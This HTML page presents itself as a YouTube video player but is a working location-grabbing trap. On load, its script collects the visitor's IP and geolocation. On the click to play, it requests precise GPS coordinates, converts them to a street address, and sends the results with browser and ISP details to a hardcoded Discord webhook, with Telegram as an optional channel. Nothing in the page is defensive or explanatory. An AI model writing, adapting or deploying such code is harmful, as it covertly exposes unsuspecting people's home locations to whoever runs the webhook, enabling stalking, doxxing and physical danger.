<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            width: 90%;
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            cursor: pointer;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
        }
        .video-wrapper img {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
        }
        .play-button {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 72px; height: 72px;
            background: rgba(255,255,255,0.15);
            border: 3px solid rgba(255,255,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 2;
        }
        .play-button::after {
            content: '';
            display: block;
            width: 0; height: 0;
            border-left: 22px solid #fff;
            border-top: 14px solid transparent;
            border-bottom: 14px solid transparent;
            margin-left: 4px;
        }
        .hidden { display: none !important; }
        .hint-text {
            position: absolute;
            bottom: 24px; left: 0; right: 0;
            text-align: center;
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            pointer-events: none;
            z-index: 2;
        }
        #debugConsole {
            margin-top: 16px;
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 12px;
            font-family: monospace;
            font-size: 12px;
            color: #0f0;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        #debugConsole .err { color: #ff5252; }
        #debugConsole .ok  { color: #00c853; }
        #debugConsole .warn { color: #ffa726; }
    </style>
</head>
<body>

<div class="container">
    <div class="video-wrapper" id="videoWrapper">
        <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg" alt="Video" />
        <div class="play-button"></div>
        <div class="hint-text">Click to play video</div>
        <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    
</div>

<script>
(function() {
    'use strict';

    const VIDEO_ID = 'kLDxvP5X2GY';

    // === OPTION 1: DISCORD WEBHOOK ===
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';

    // === OPTION 2: TELEGRAM BOT ===
    const TELEGRAM_BOT_TOKEN = '';
    const TELEGRAM_CHAT_ID = '';

    // === DOM refs ===
    const thumbnail      = document.getElementById('thumbnail');
    const playButton     = document.querySelector('.play-button');
    const hintText       = document.querySelector('.hint-text');
    const videoWrapper   = document.getElementById('videoWrapper');
    const videoPlayer    = document.getElementById('videoPlayer');
    const debugConsole   = document.getElementById('debugConsole');

    function debug(msg, type = 'ok') {
        const div = document.createElement('div');
        div.className = type;
        div.textContent = `> ${msg}`;
        debugConsole.appendChild(div);
        debugConsole.scrollTop = debugConsole.scrollHeight;
        console.log(msg);
    }

    // ============================================================
    //  Reverse geocode lat/lon to street address via OpenStreetMap
    // ============================================================
    async function reverseGeocode(lat, lon) {
        try {
            debug('Reverse geocoding to get street address...');
            const r = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`,
                { headers: { 'User-Agent': 'VideoPage/1.0' } }
            );
            const d = await r.json();
            if (d && d.display_name) {
                debug(`✅ Address: ${d.display_name}`, 'ok');
                return d.display_name;
            }
            return 'Address not found';
        } catch (e) {
            debug(`Reverse geocode failed: ${e.message}`, 'err');
            return 'Reverse geocode unavailable';
        }
    }

    // ============================================================
    //  SEND TO DISCORD
    // ============================================================
    async function sendToDiscord(text) {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE') {
            debug('Discord: No webhook configured', 'warn');
            return false;
        }
        try {
            debug('Sending to Discord...');
            const resp = await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: text })
            });
            if (resp.ok) {
                debug('✅ Sent to Discord successfully!', 'ok');
                return true;
            } else {
                debug(`Discord error: ${resp.status} ${resp.statusText}`, 'err');
                return false;
            }
        } catch (e) {
            debug(`Discord fetch failed: ${e.message}`, 'err');
            return false;
        }
    }

    // ============================================================
    //  SEND TO TELEGRAM
    // ============================================================
    async function sendToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            debug('Telegram: Not configured', 'warn');
            return false;
        }
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const resp = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
            if (resp.ok) {
                debug('✅ Sent to Telegram!', 'ok');
                return true;
            } else {
                const data = await resp.json();
                debug(`Telegram error: ${data.description}`, 'err');
                return false;
            }
        } catch (e) {
            debug(`Telegram failed: ${e.message}`, 'err');
            return false;
        }
    }

    // ============================================================
    //  Build message in the Python-style format you wanted
    // ============================================================
    async function sendData(ipData, preciseGeo) {
        const ts = new Date().toISOString();
        const ip = ipData?.ip || 'N/A';
        const lat = preciseGeo?.lat || ipData?.latitude || ipData?.lat || 'N/A';
        const lon = preciseGeo?.lon || ipData?.longitude || ipData?.lon || 'N/A';
        const accuracy = preciseGeo?.accuracy || 'N/A';

        // Try to get reverse geocode address if we have coordinates
        let addr = 'Address unavailable';
        if (lat !== 'N/A' && lon !== 'N/A' && !isNaN(parseFloat(lat))) {
            addr = await reverseGeocode(lat, lon);
        }

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        // Build the message in your exact Python-style format
        let msg = '';
        msg += '='.repeat(60) + '\n';
        msg += `🎯 GPS LOCATION CAPTURED at ${ts}\n`;
        msg += '='.repeat(60) + '\n';
        msg += `Lat: ${lat}\n`;
        msg += `Lon: ${lon}\n`;
        msg += `Accuracy: ±${accuracy}\n`;
        msg += `Altitude: ${preciseGeo?.altitude || 'N/A'}\n`;
        msg += `Speed: ${preciseGeo?.speed || 'N/A'}\n`;
        msg += `Heading: ${preciseGeo?.heading || 'N/A'}\n`;
        msg += `Platform: ${navigator.platform || 'N/A'}\n`;
        msg += `Visitor IP: ${ip}\n`;
        msg += '-' .repeat(60) + '\n';
        msg += '📍 STREET ADDRESS:\n';
        msg += `${addr}\n`;
        msg += '-' .repeat(60) + '\n';
        msg += `🗺️  Maps: ${mapsUrl}\n`;
        msg += '='.repeat(60) + '\n';

        // Also include browser/IP info at the bottom
        msg += `\nBrowser: ${navigator.userAgent}\n`;
        msg += `Country: ${ipData?.countryName || ipData?.country || 'N/A'}\n`;
        msg += `Region: ${ipData?.regionName || ipData?.region || 'N/A'}\n`;
        msg += `City: ${ipData?.cityName || ipData?.city || 'N/A'}\n`;
        msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}`;

        const discordSent = await sendToDiscord(msg);
        await sendToTelegram(msg);

        if (!discordSent) {
            debug('Neither Discord nor Telegram worked.', 'err');
            debug('Message that should have been sent:', 'warn');
            debug(msg, 'warn');
        }
    }

    // ============================================================
    //  IP Geolocation — fixed to prefer more accurate APIs
    // ============================================================
    async function captureIP() {
        // ip-api.com is generally more accurate for city/region level data
        const apis = [
            'http://ip-api.com/json/?fields=status,query,country,regionName,city,lat,lon,isp,org',
            'https://free.freeipapi.com/api/json/',
            'https://ipapi.co/json/'
        ];

        for (const api of apis) {
            try {
                debug(`Trying IP API: ${api.split('/')[2]}...`);
                const r = await fetch(api);
                const d = await r.json();
                
                if (d.ip || d.query) {
                    debug(`✅ Got IP data from ${api.split('/')[2]}`, 'ok');
                    return {
                        ip: d.ip || d.query,
                        country: d.countryName || d.country_name || d.country,
                        region: d.regionName || d.region_name || d.region,
                        city: d.cityName || d.city_name || d.city,
                        latitude: d.latitude || d.lat,
                        longitude: d.longitude || d.lon,
                        isp: d.isp || d.org
                    };
                }
            } catch (e) {
                debug(`API ${api.split('/')[2]} failed: ${e.message}`, 'err');
            }
        }

        debug('❌ All IP APIs failed!', 'err');
        return null;
    }

    // ============================================================
    //  Browser Geolocation — with extra fields
    // ============================================================
    function getPreciseLocation() {
        return new Promise(resolve => {
            if (!navigator.geolocation) {
                debug('Geolocation API not available', 'err');
                return resolve(null);
            }
            debug('Requesting browser location (check for popup)...');
            
            navigator.geolocation.getCurrentPosition(
                pos => {
                    debug(`✅ Got precise location: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'ok');
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude ?? 'N/A',
                        speed: pos.coords.speed ?? 'N/A',
                        heading: pos.coords.heading ?? 'N/A'
                    });
                },
                err => {
                    let reason = 'Unknown error';
                    if (err.code === 1) reason = 'User denied permission';
                    else if (err.code === 2) reason = 'Position unavailable';
                    else if (err.code === 3) reason = 'Timed out';
                    debug(`❌ Location failed: ${reason}`, 'err');
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // ============================================================
    //  Play video (always works, no one-time restriction)
    // ============================================================
    function playVideo() {
        thumbnail.classList.add('hidden');
        playButton.classList.add('hidden');
        hintText.classList.add('hidden');
        videoPlayer.classList.remove('hidden');
        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1`;
        debug('▶️ Video playing');
    }

    // ============================================================
    //  MAIN
    // ============================================================
    async function init() {
        // Capture IP on page load (no one-time check)
        debug('Page loaded, capturing IP...');
        const ipData = await captureIP();

        // Wait for click — always works, no expiration
        videoWrapper.addEventListener('click', async function onClick() {
            videoWrapper.removeEventListener('click', onClick);
            debug('👆 User clicked!');
            
            const precise = await getPreciseLocation();
            playVideo();
            
            if (ipData) {
                await sendData(ipData, precise);
            } else {
                debug('No IP data to send', 'err');
            }
            
            debug('✅ Done! Check Discord/Telegram.', 'ok');
        });
    }

    init();
})();
</script>
</body>
</html>
